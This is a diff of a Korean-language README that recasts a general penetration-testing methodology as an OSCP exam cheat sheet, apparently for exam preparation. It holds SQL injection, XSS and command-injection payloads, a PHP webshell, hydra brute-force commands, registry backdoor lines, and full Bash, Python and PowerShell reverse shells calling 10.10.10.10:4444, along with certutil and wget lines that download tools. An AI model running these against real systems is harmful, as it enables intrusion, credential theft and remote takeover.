@@ -2,439 +2,315 @@
     <img src="https://www.kali.org/images/kali-dragon-icon.svg" alt="Kali Linux 로고" width="150" />
 </div>
 
-### Kali Linux 보안 & 침투 테스트 활동을 위해 격리된 환경을 제공합니다.
+<div align="center">
+    <h1>OSCP 침투 테스트 치트시트</h1>
+</div>
 
-강력한 침투 프레임워크를 활용하여 침투, 피봇, 자동화, 중앙처리, 강력한 우회, 파일리스 인 메모리 트랜드를 따릅니다.
+> **중요**: 이 문서는 OSCP 시험을 위한 참고용 치트시트입니다. OSCP 시험에서는 다음을 사용할 수 없습니다:
+>
+> - 스푸핑 (IP, ARP, DNS, NBNS 등)
+> - 상용 도구 (Metasploit Pro, Burp Pro 등)
+> - 자동화 익스플로잇 도구 (db_autopwn, SQLmap, SQLninja 등)
+> - 대규모 취약점 스캐너 (Nessus, OpenVAS 등)
+> - AI 챗봇 (OffSec KAI, ChatGPT 등)
+
+### Kali Linux 환경에서 수동 침투 기법 중심으로 작성되었습니다.
 
 # 침투 방법론
 
 ## 1. 정보 수집
 
-    - happy path
+> **OSCP 팁**: 정보 수집에 충분한 시간을 투자하세요. 대부분의 취약점은 철저한 정보 수집을 통해 발견됩니다.
+
     - 포트스캔
-      - nmap 스캔: nmap -sC -sV -p- -oA scan_results <타겟IP>
-      - masscan: masscan -p1-65535 <타겟IP> --rate=1000
-      - wireshark를 통한 패킷 캡처 및 분석
-    - nc 직접 연결 스캔: nc -nvz <타겟IP> 1-1000
+      - nmap 기본 스캔: nmap -sV -sC <타겟IP> -oN initial_scan
+      - 전체 포트 스캔: nmap -sV -sC -p- <타겟IP> -oN full_scan --min-rate 1000
+      - UDP 스캔: sudo nmap -sU -sV --top-ports 20 <타겟IP> -oN udp_scan
+      - 스크립트 스캔: nmap --script vuln <타겟IP> -oN vuln_scan
+
     - 서비스 스캔
       - 웹서비스: whatweb <타겟URL>, nikto -host <타겟IP>
-      - DNS: dig, host, nslookup
-      - SNMP: snmpwalk, snmp-check
+      - DNS: dig axfr @<타겟IP> <도메인명>, host -l <도메인명> <타겟IP>
+      - SNMP: snmpwalk -v2c -c public <타겟IP>, onesixtyone <타겟IP> public
       - 배너 그래빙: nc <타겟IP> <포트>
-    - 패시브 정보 수집
-      - OSINT: Shodan, Censys, Google Dorks
-      - WHOIS, DNS 조회
+
     - 웹 애플리케이션 매핑
-      - 디렉토리 브루트포싱: gobuster, dirbuster, ffuf
-      - 기술 스택 식별: Wappalyzer, builtwith
-    - exploit framework
-      - searchsploit를 이용한 로컬 취약점 검색
+      - 디렉토리 브루트포싱:
+        - gobuster dir -u http://<타겟IP> -w /usr/share/wordlists/dirb/common.txt
+        - ffuf -u http://<타겟IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c
+        - ffuf 필터링: ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<타겟IP>/FUZZ -fc 403,404
+
+      - HTTP 요청 테스트:
+        - curl -X POST -d "param=value" http://<타겟IP>/endpoint
+        - curl -i -s -k -X $'GET' -H $'Host: <타겟IP>' -H $'User-Agent: Mozilla/5.0' <URL>
+
+      - 기술 스택 식별: 헤더 분석, 소스 코드 검사, 에러 메시지 분석
+
+    - 워드리스트 활용 (OSCP 추천)
+      - 디렉토리 브루트포싱: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+      - 비밀번호 공격: /usr/share/wordlists/rockyou.txt
+      - 사용자명: /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
+      - 파일 확장자: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
 
 ## 2. 취약점 분석
 
-    - DDOS | DOS 는 스트레스 테스트에 주로 사용하며 실제 모의해킹에서는 자주 사용하지 않음
-    - Authenticated, Unauthenticated 인증 또는 미인증 payload 공격이 가능한지 판단하기
-    - SSH 공개키 확보
-      - 약한 SSH 키 설정 확인
-      - 키 관리 문제 검사 (authorized_keys, known_hosts)
-    - 힙메모리, 어셈블리 침투 등 복잡한 방법도 많지만 고급보다는 쉬운 방법의 조합으로도 얼마든지 대문열고 들어갈 수 있음
-    - 서비스, OS, 하드웨어 등 다양한 방식으로 수집한 취약점들을 조합하여 공격 계획 세우기
-    - 수동 (정확도, 디테일, 비용) / 자동 (거짓 양성, 거짓 음성) 취약점 진단
-    	1. 오픈된 포트가 있는가
-    	2. 어떤 서비스를 사용중인가
-    	3. 연결이 되는가
-    	4. 소통이 되는가
-    	5. 어떤 정보를 수집할 수 있는가
-    	6. 수집한 정보를 조합하여 취약점을 찾아내고 해당 취약점을 악용할 수 있는 방법은 무엇인가
-    - 발견된 모든 정보는 문서화
-    - source 분석 웹이라면 OWASP REST API
-    - sink 입력된 값에 대해 시스템과 서비스 내에서 어떻게 사용되는가
-    - happy path testing
+> **OSCP 팁**: 항상 수동 확인을 우선시하세요. 자동화 도구는 거짓 양성/음성이 많습니다.
+
+    - 수동 취약점 분석 (OSCP 시험 핵심)
+      - 서비스 버전 확인 및 알려진 취약점 조사
+      - 설정 파일 점검 및 오설정 찾기
+      - 소스 코드 검토 (접근 가능한 경우)
+      - 인증 메커니즘 테스트
 
     - 웹 애플리케이션 취약점 분석
-      - burpsuite (postman + webproxy)
-        - 요청 및 응답 분석
-        - 세션 관리 취약점 테스트
-        - 인증 우회 테스트
-      - robots.txt 블랙 리스트 처리된 경로 확인
-      - LFI, RFI 서버 내 파일 실행
+      - 수동 SQL 인젝션 테스트: ' OR 1=1 --, admin' --, 등
+      - XSS 테스트: <script>alert(1)</script>
+      - 파일 업로드:
+        - 확장자 변경 우회 (.php -> .php5, .phtml, .php.jpg)
+        - Content-Type 변조 (image/jpeg -> application/x-php)
+      - 파일 포함 취약점:
         - LFI: curl "http://<타겟IP>/page.php?file=../../../etc/passwd"
-        - RFI: curl "http://<타겟IP>/page.php?file=http://<공격자IP>/shell.php"
-      - dir brute force : gobuster, fuff, wfuzz
-        - gobuster dir -u http://<타겟IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-        - ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<타겟IP>/FUZZ
-      - file upload :
-    	    1. 확장자 변경: .php -> .php5, .phtml, .php.jpg
-    	    2. 웹 서버에 맞는 파일 php, node, java, rust 등
-    	    3. 매직 바이트 변경 xxd
-    	    4. Content Type (MIME Type) 변조: image/jpeg -> application/x-php
-      - command injection
-        - 기본 주입: ; ls -la
-        - 출력 리다이렉션: $(cat /etc/passwd)
-        - 역슬래시 우회: c\at /etc/passwd
-      - CVE
-          1. 분석 및 검토: searchsploit, exploitdb, NVD 확인
-          2. 페이로드 준비: 환경에 맞게 수정
+        - PHP Filter: curl "http://<타겟IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php"
+      - 명령어 삽입: ; id, && whoami, $(id)
 
     - 네트워크 서비스 취약점
-      - Recursive Directory brute force
-      - SMB 445
-          1. netexec smb <타겟IP> -u <유저명> -p <패스워드>
-          2. smbmap -H <타겟IP> -u <유저명> -p <패스워드>
-          3. smbclient //<타겟IP>/share -U <유저명>
-          4. rpcclient -U "" <타겟IP> (익명 연결 시도)
-          5. 취약한 버전 확인: Eternal Blue (MS17-010)
-      - NFS 111, 2049
-          1. showmount -e <타겟IP>
-          2. no_root_squash 활성화 취약점 확인
-              - nfsclient 로 직접 확인이 불가하므로 로컬 디렉토리에 직접 마운트하여 확인하기
-              - mount -t nfs <타겟IP>:/shared /mnt/nfs
-              - /etc/exports 파일에서 no_root_squash 설정 확인
-      - FTP 21
-          1. anonymous 로그인 시도: ftp <타겟IP> (user: anonymous)
-          2. 브루트포스: hydra -l <유저명> -P <패스워드리스트> ftp://<타겟IP>
-          3. 설정 파일 확인: vsftpd.conf, proftpd.conf
-      - SSH 22
-          1. 배너 그래빙: 버전 정보 수집
-          2. 브루트포스: hydra -l <유저명> -P <패스워드리스트> ssh://<타겟IP>
-          3. 약한 키 설정: ssh-audit <타겟IP>
-      - SMTP 25, 587
-          1. 이메일 계정 열거: smtp-user-enum
-          2. VRFY, EXPN, RCPT 명령으로 사용자 검증
-      - HTTP/HTTPS 80, 443
-          1. 서버 정보 노출: 헤더 분석
-          2. 웹 취약점 스캐닝: nikto, OWASP ZAP
-          3. SSL 설정 분석: sslscan, testssl.sh
-      - RDP 3389
-          1. 인증 브루트포스: crowbar, hydra
-          2. BlueKeep (CVE-2019-0708) 취약점 확인
+      - SMB 공유 조사:
+        - smbclient -L //<타겟IP>/ -N
+        - smbclient //<타겟IP>/share -N
+        - rpcclient -U "" <타겟IP>
+      - NFS:
+        - showmount -e <타겟IP>
+        - mount -t nfs <타겟IP>:/share /mnt/nfs
+      - FTP:
+        - anonymous 로그인
+        - 설정 파일 검사
+      - SSH:
+        - 약한 암호화 알고리즘
+        - 키 기반 인증 취약점
 
 ## 3. 초기 침투 (최초 액세스 확보)
 
-    - 패스워드 공격
-      - 브루트포스: Hydra, Medusa, Patator
+> **OSCP 팁**: 수동 익스플로잇을 작성하는 연습을 하세요. 많은 경우 기존 익스플로잇을 약간 수정해야 작동합니다.
+
+    - 인증 공격
+      - 브루트포스 (제한적으로 사용):
         - hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<타겟IP>
-        - hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
-      - 패스워드 스프레이: 다수의 계정에 소수의 흔한 비밀번호 시도
-      - 기본 자격증명(Default Credentials) 시도
+        - hydra -L users.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
+      - 기본 자격증명 시도 (admin:admin, admin:password, 등)
 
-    - 웹 애플리케이션 공격
-      - SQL 인젝션
-        - 기본 인젝션: ' OR 1=1 --
+    - 수동 웹 취약점 공격
+      - SQL 인젝션:
         - 인증 우회: admin' --
-        - 블라인드 SQLi: ' AND (SELECT 1 FROM users WHERE username='admin' AND length(password)>8)=1 --
-        - 데이터베이스 열거: UNION SELECT 활용
-        - sqlmap 자동화: sqlmap -u "http://<타겟IP>/page.php?id=1" --dbs
-      - XSS (Cross-Site Scripting)
-        - 반사형(Reflected): <script>alert('XSS')</script>
-        - 저장형(Stored): 데이터베이스에 저장되는 XSS 페이로드
-        - DOM 기반: 클라이언트 측 스크립트 조작
-      - CSRF (Cross-Site Request Forgery)
-        - 토큰 검증 우회
-        - 요청 위조 테스트
-      - File Inclusion
-        - LFI to RCE 기법: log poisoning, /proc/self/environ
-        - PHP wrappers 활용: php://filter/convert.base64-encode/resource=index.php
+        - 데이터 추출: ' UNION SELECT 1,2,3,4,5 --
+        - 수동 블라인드: ' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a' --
+      - 파일 업로드 + 웹쉘:
+        - PHP 웹쉘: <?php system($_GET['cmd']); ?>
+        - 업로드 후: curl "http://<타겟IP>/uploads/shell.php?cmd=id"
+      - LFI → RCE:
+        - 로그 오염 (Log Poisoning)
+        - proc/self/environ 악용
 
-    - 네트워크 서비스 공격
-      - 원격 코드 실행(RCE)
-        - Metasploit 프레임워크 활용
-        - 공개 익스플로잇 수정 및 활용
-      - 서비스별 취약점
-        - WebLogic, Tomcat, JBoss 등 서버 취약점
-        - Jenkins, Jira, GitLab 등 도구 취약점
-      - 자격 증명 탈취
-        - Responder를 통한 NTLM 해시 캡처
-        - Mimikatz를 통한 메모리 내 자격 증명 추출
-      - 이메일 피싱 (OSCP 시험에서는 제한적으로 사용)
-        - 스피어 피싱
-        - 매크로 활성화 문서
+    - 수동 익스플로잇 활용
+      - searchsploit로 익스플로잇 검색
+      - 익스플로잇 코드 검토 및 수정
+      - Python/Bash/PowerShell 스크립트 수동 실행
 
 ## 4. 권한 상승
 
+> **OSCP 팁**: LinPEAS/WinPEAS는 매우 유용하지만 결과를 항상 수동으로 확인하세요.
+
     - Windows 권한 상승
-      - 보안 패치 누락 확인
+      - 패치 누락 확인:
         - systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
-        - Watson, Windows Exploit Suggester
-      - 알려진 취약점 활용
-        - Kernel 취약점: MS16-032, MS15-051
-        - 서비스 취약점: Unquoted Service Path, 취약한 서비스 실행 파일
-      - 잘못된 권한 설정
-        - icacls 명령어로 권한 확인
-        - AccessChk 도구 활용
-      - AlwaysInstallElevated 설정 확인
-      - DLL 하이재킹
-      - UAC 바이패스
-      - 자격 증명 수집
-        - 윈도우 자격 증명 관리자
-        - SAM 파일
-        - LSASS 메모리 덤프
+        - wmic qfe get Caption,Description,HotFixID,InstalledOn
+      - 권한 설정 검사:
+        - accesschk.exe -uwcqv "Authenticated Users" *
+        - icacls "C:\Program Files\*" | findstr "BUILTIN\Users:(F)" /c:"BUILTIN\Users:(M)"
+      - 서비스 취약점:
+        - Unquoted Service Path
+        - 허가된 서비스 파일 교체
+      - AlwaysInstallElevated:
+        - reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
     - Linux 권한 상승
-      - 커널 취약점 (Dirty COW 등)
-        - uname -a로 커널 버전 확인
-        - searchsploit로 해당 버전 취약점 검색
-      - SUID/SGID 바이너리 검색
-        - find / -perm -4000 -type f 2>/dev/null
-        - 취약한 SUID 바이너리 악용
-      - sudo 권한 오용
-        - sudo -l로 현재 사용자의 sudo 권한 확인
-        - GTFOBins 참조하여 권한 상승 방법 확인
-      - 환경 변수 활용
-        - PATH 변수 조작
-        - LD_PRELOAD 악용
-      - cron 작업 조작
-        - 쓰기 가능한 cron 스크립트 검색
-        - 와일드카드 명령어 악용
-      - 서비스 설정 파일 변경
-      - 취약한 라이브러리 로드
-      - 캐퍼빌리티 오용
-        - getcap -r / 2>/dev/null
+      - 커널 취약점:
+        - uname -a (버전 확인)
+        - searchsploit linux kernel <버전>
+      - SUID 바이너리:
+        - find / -perm -u=s -type f 2>/dev/null
+      - sudo 권한:
+        - sudo -l
+      - 취약한 cron 작업:
+        - cat /etc/crontab
+        - find writable cron scripts
+      - 잘못된 파일 권한:
+        - find / -writable -type f -not -path "/proc/*" 2>/dev/null
 
-    - 자동화 도구
-      - Linux: LinPEAS, LinEnum, linux-smart-enumeration
-      - Windows: WinPEAS, PowerUp, JAWS, Sherlock
-      - 모두: pspy (프로세스 모니터링)
+    - 권한 상승 점검 도구 (자동화 + 수동 확인)
+      - Linux: LinPEAS, LinEnum
+      - Windows: WinPEAS, PowerUp
+      - 공통: pspy (프로세스 모니터링)
 
-## 5. 권한 유지
-
-    - 지속성 확보 메커니즘
-      - 백도어 생성
-        - 웹쉘: PHP, ASP, JSP 웹쉘 설치
-        - 리버스 쉘: 지속적 연결을 위한 스크립트 설정
-      - 사용자 계정 생성
-        - 관리자 계정 추가
-        - 기존 계정 권한 상승
+## 5. 권한 유지 (OSCP 시험에서는 불필요할 수 있음)
 
     - Windows 지속성
-      - 시작 폴더에 파일 추가
-      - 레지스트리 수정
-        - Run/RunOnce 키 활용
-        - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-      - 서비스 생성
-        - sc create 명령어 활용
-      - 예약 작업
-        - schtasks /create 명령어 활용
-      - WMI 이벤트 구독
-      - DLL 사이드로딩
+      - 시작 폴더: 실행 파일 추가
+      - 레지스트리 Run 키: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"
+      - 서비스 생성: sc create MyService binPath= "cmd.exe /c C:\backdoor.exe"
 
     - Linux 지속성
       - cron 작업 등록
-        - crontab -e
-        - /etc/crontab 수정
       - 시작 스크립트 수정
-        - rc.local, init.d 스크립트 등
-      - SSH 키 설치
-        - ~/.ssh/authorized_keys 파일 수정
-      - PAM 모듈 수정
-      - 서비스 생성
-        - systemd 서비스 파일 생성
+      - SSH 키 배치: ~/.ssh/authorized_keys
 
-    - 메모리 상주 기법 (파일리스 악성코드)
-      - Windows: PowerShell Empire, Mimikatz
-      - Linux: 메모리 내 실행 기법
+    - 백도어
+      - 관리자 계정 생성
+      - 웹쉘 설치
+      - 리버스 쉘 스크립트 설정
 
 ## 6. 측면 이동 (Lateral Movement)
 
-    - 네트워크 정찰
-      - 내부 네트워크 스캔
-        - ping sweep: for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from"; done
-        - nmap 내부 스캔: nmap -sn 10.10.10.0/24
-      - 네트워크 트래픽 분석
-      - 활성 세션 검사
+> **OSCP 팁**: 자격 증명 재사용과 로컬 네트워크 스캔은 시험에서 매우 중요합니다.
+
+    - 내부 네트워크 탐색
+      - IP 범위 확인: ipconfig/ifconfig, netstat -r
+      - 내부 호스트 검색: ping sweep, arp -a
+      - 포트 스캔: nmap -sV -p- 10.0.0.1-10 (제한된 범위)
 
     - 자격 증명 수집 및 재사용
-      - 해시 덤핑: Mimikatz, hashdump
-      - 패스워드 스프레이
-      - Pass-the-Hash 공격
-      - Pass-the-Ticket 공격
-      - 자격 증명 파일 검색 (config 파일, 백업 등)
+      - Windows 자격 증명: cmdkey /list, saved browsers passwords
+      - 설정 파일에서 비밀번호: config.php, wp-config.php, .bash_history
+      - 비밀번호 재사용: 발견된 비밀번호로 다른 서비스 접근 시도
 
     - 원격 액세스
-      - 원격 데스크톱 프로토콜(RDP)
-      - SSH 터널링
-      - WinRM, WMI
-      - SMB를 통한 접근 (psexec)
+      - PsExec: psexec.py user:password@<타겟IP> cmd
+      - WinRM: evil-winrm -i <타겟IP> -u user -p password
+      - SSH 키 재사용
 
-    - 도메인 환경 공격 (AD)
-      - Kerberoasting
-      - Golden/Silver Ticket
-      - DCSync
+## 7. 증거 수집 (OSCP 시험 필수)
 
-## 7. 증거 수집
+> **OSCP 팁**: 모든 플래그를 스크린샷과 함께 저장하고 시스템별로 정리하세요.
 
-    - 민감한 정보 추출
-      - 비밀번호 파일: /etc/shadow, SAM
-      - 설정 파일
-      - 데이터베이스 접근
-      - API 키, 토큰
+    - 플래그 파일 찾기
+      - 리눅스: find / -name proof.txt -o -name local.txt 2>/dev/null
+      - 윈도우: dir /s /b proof.txt local.txt
 
-    - 사용자 데이터 검색
-      - 이메일, 문서, 스프레드시트
-      - 히스토리 파일 (.bash_history, PowerShell 로그)
+    - 스크린샷 증거
+      - 관리자/루트 상태에서 whoami 명령어
+      - 플래그 파일과 함께 hostname/IP 표시
+      - 취약점 증명 과정 캡처
 
     - 시스템 정보 수집
-      - OS 버전 및 패치 정보
-      - 실행 중인 서비스 목록
+      - 사용자 목록
       - 네트워크 구성
-      - 사용자 계정 목록
+      - 중요 파일 및 디렉터리 권한
 
-    - 로그 분석
-      - 로그인 기록
-      - 실패한 접속 시도
-      - 서비스 로그
+## 8. 정리 (OSCP 시험에서는 불필요)
 
-## 8. 정리 (Covering Tracks)
+    - 사용한 도구 제거
+    - 생성한 파일 삭제
+    - 로그 정리
+    - 추가한 계정 삭제
 
-    - 로그 청소
-      - Windows: 이벤트 로그 삭제/조작
-      - Linux: /var/log 파일 삭제/수정
-      - 웹 서버 로그 정리
+# OSCP 시험 특화 팁
 
-    - 임시 파일 제거
-      - 페이로드, 스크립트 등 공격 도구 제거
-      - /tmp, %TEMP% 디렉토리 청소
+## 시간 관리
 
-    - 계정 및 권한 정리
-      - 생성한 계정 제거
-      - 수정한 권한 복원
+    - 25점 짜리 Active Directory 문제부터 시작하세요
+    - 점수 계산을 항상 염두에 두고 문제를 선택하세요
+    - 한 시스템에 2-3시간 이상 소요되면 다른 시스템으로 전환하세요
+    - 휴식 시간을 반드시 가지세요 (최소한 6-8시간 수면)
 
-    - 지속성 메커니즘 제거
-      - 백도어 제거
-      - 추가한 cron/예약 작업 제거
-      - 변경한 시작 스크립트 복원
+## 문서화
 
-# 공격 벡터별 테크닉
+    - 실시간으로 문서화하세요 (스크린샷, 명령어, 출력 결과)
+    - 각 시스템별로 별도 문서 유지
+    - 시도한 방법과 결과를 모두 기록 (실패한 것도 포함)
+    - 플래그와 증거 스크린샷은 즉시 저장
 
-## 웹 애플리케이션 공격
+## 문제 해결 전략
 
-    - SQL 인젝션
-      - Error-based: 에러 메시지를 통한 정보 수집
-      - Union-based: UNION SELECT를 통한 데이터 추출
-      - Blind: Boolean 또는 Time-based 방식으로 정보 추출
-      - Out-of-band: 외부 채널을 통한 데이터 유출
+    - 열린 포트에서 실행 중인 모든 서비스 확인
+    - 발견된 모든 사용자 이름/비밀번호 목록 유지
+    - Windows에서는 SeImpersonatePrivilege 권한 확인 (PrintSpoofer/JuicyPotato)
+    - 리버스 쉘이 작동하지 않으면 바인드 쉘 시도
+    - 외부 도구가 필요하면 SimpleHTTPServer로 전송
 
-    - 인증 우회
-      - 약한 자격 증명
-      - 브루트포스
-      - 세션 관리 취약점
-      - OAuth 구현 오류
+## OSCP 허용 도구 모음
 
-    - 업로드 취약점
-      - 확장자 필터링 우회
-      - MIME 타입 조작
-      - 이중 확장자: shell.php.jpg
-      - null byte 삽입: shell.php%00.jpg
+    - 정보 수집: nmap, nikto, gobuster, ffuf, enum4linux
+    - 웹 애플리케이션: Burp Suite Community, OWASP ZAP
+    - 익스플로잇: searchsploit, Metasploit(제한적)
+    - 권한 상승: LinPEAS, WinPEAS, PowerUp, pspy
+    - 비밀번호 공격: hydra, hashcat, John the Ripper
 
-## 네트워크 서비스 공격
+## Metasploit 제한 사항
 
-    - SMB 서비스 공격
-      - EternalBlue (MS17-010)
-      - SambaCry (CVE-2017-7494)
-      - 약한 SMB 공유 권한
+    - OSCP 시험에서는 Metasploit/Meterpreter를 **단 하나의 시스템**에만 사용할 수 있습니다.
+    - Metasploit 사용을 최대한 피하고, 수동 익스플로잇을 연습하세요.
+    - Multi/Handler는 제한 없이 사용 가능합니다.
 
-    - RDP 공격
-      - BlueKeep (CVE-2019-0708)
-      - 약한 인증
-      - NLA 비활성화 악용
+## 워드리스트 선택 가이드
 
-    - SSH 공격
-      - 약한 암호화 설정
-      - 키 기반 인증 약점
-      - 구형 프로토콜 버전
+    - 디렉토리 브루트포싱:
+      - 기본: /usr/share/wordlists/dirb/common.txt
+      - 대규모: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
-## 방화벽/WAF 우회 기법
+    - 비밀번호 크래킹:
+      - 주력: /usr/share/wordlists/rockyou.txt
 
-    - IP 프래그먼테이션
-    - 인코딩 변형
-      - URL 인코딩, 이중 인코딩
-      - Base64, HEX 인코딩
-    - 프로토콜 변형
-    - 타이밍 공격
+    - 사용자명:
+      - /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+      - /usr/share/seclists/Usernames/Names/names.txt
 
-## 침투 도구
+## 유용한 명령어 모음
 
-    - 정보 수집
-      - nmap, masscan, dmitry, recon-ng
-      - TheHarvester, Shodan, OSINT Framework
+    - 리버스 쉘:
+      ```bash
+      # Bash
+      bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
 
-    - 취약점 스캔
-      - Nessus, OpenVAS, Nikto
-      - WPScan, SQLmap, OWASP ZAP
+      # Python
+      python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 
-    - 익스플로잇
-      - Metasploit Framework
-      - SearchSploit
-      - BeEF (Browser Exploitation Framework)
+      # PowerShell
+      powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+      ```
 
-    - 권한 상승
-      - LinPEAS/WinPEAS
-      - Linux-Exploit-Suggester, Windows-Exploit-Suggester
-      - PowerUp, PowerSploit
+    - 업그레이드된 쉘:
+      ```bash
+      python -c 'import pty; pty.spawn("/bin/bash")'
+      export TERM=xterm
+      Ctrl+Z [background]
+      stty raw -echo; fg
+      reset
+      ```
 
-    - 포스트 익스플로잇
-      - Empire, PoshC2
-      - Mimikatz, LaZagne
-      - CrackMapExec
+    - 파일 전송:
+      ```bash
+      # 공격자 측
+      python3 -m http.server 8000
 
-# C2 (Command & Control)
+      # 대상 측 (Linux)
+      wget http://10.10.10.10:8000/linpeas.sh
+      curl -O http://10.10.10.10:8000/linpeas.sh
 
-    - 오픈소스 C2 프레임워크
-      - Cobalt Strike (상용)
-      - Sliver - 고급 크로스 플랫폼 C2
-      - Havoc - 최신 C2 프레임워크
-      - Mythic - 다중 에이전트 C2
+      # 대상 측 (Windows)
+      certutil -urlcache -f http://10.10.10.10:8000/winpeas.exe winpeas.exe
+      Invoke-WebRequest "http://10.10.10.10:8000/winpeas.exe" -OutFile "winpeas.exe"
+      ```
 
-    - 기능
-      - 세션 관리
-      - 페이로드 생성
-      - 통신 프로파일
-      - 플러그인 및 확장성
-      - 데이터 수집 및 유출
-      - 기타 포스트 익스플로잇 기능
+## 문제 발생 시 확인사항
 
-    - 통신 채널 구성
-      - DNS 터널링
-      - HTTPS 보안 통신
-      - 도메인 프론팅
-      - 커스텀 프로토콜
+    - VPN 연결이 안정적인지 확인
+    - 핵심 정보를 놓치지 않았는지 처음부터 다시 검토
+    - 실패한 방법을 계속 시도하기보다 새로운 접근법 시도
+    - 시험 중 기술적 문제가 발생하면 즉시 지원팀에 연락
 
-# 문서화 및 보고
+# 마지막 체크리스트
 
-    - 증거 수집 및 보존
-      - 스크린샷
-      - 명령어 출력 기록
-      - 로그 파일
-
-    - 보고서 작성
-      - 취약점 상세 설명
-      - 공격 방법 재현 단계
-      - 위험도 평가
-      - 해결 방안 제시
-
-    - 의사소통
-      - 기술적/비기술적 의사소통
-      - 명확한 취약점 영향 설명
-      - 우선순위 제안
-
-# 실전 침투 테스트 팁
-
-    - 메모 습관 기르기
-      - KeepNote, CherryTree, Obsidian
-      - 모든 명령어와 결과 기록
-      - 스크린샷 체계적 보관
-
-    - 네트워크 연결 관리
-      - 안정적인 VPN 연결 유지
-      - 세션 유지 기법 활용
-      - 여러 경로의 접근 유지
-
-    - 시간 관리
-      - Rabbit hole 피하기
-      - 지나치게 복잡한 공격 지양
-      - 주기적 휴식과 관점 전환
-
-    - 침착함 유지
-      - 체계적 접근 방식 유지
-      - 기본기에 충실한 공격
-      - 상황 정리 및 재시작
+    - 모든 시스템 점수 계산 (70점 이상 필요)
+    - 모든 플래그와 증거가 적절히 문서화됨
+    - 보고서에 사용할 스크린샷이 충분히 준비됨
+    - 각 문제 해결 과정이 단계별로 문서화됨
+    - 보고서 작성을 위한 템플릿이 준비됨
